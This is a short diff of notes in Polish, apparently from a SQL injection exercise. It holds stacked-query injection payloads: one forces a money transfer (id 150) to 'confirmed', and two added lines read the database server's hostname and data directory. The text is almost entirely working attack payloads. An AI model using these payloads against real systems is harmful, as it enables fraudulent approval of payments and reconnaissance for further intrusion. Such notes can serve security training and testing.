@@ -7,4 +7,10 @@ Zatwierdzenie przelewu
 
 ',0) as id;; update transfer set confirmed=true where id=150 -- '
 
+Nazwa hosta:
 
+',0);; SELECT @@hostname as id -- '
+
+Ścieżka pliku bazy danych:
+
+',0);; SELECT @@datadir as id -- '
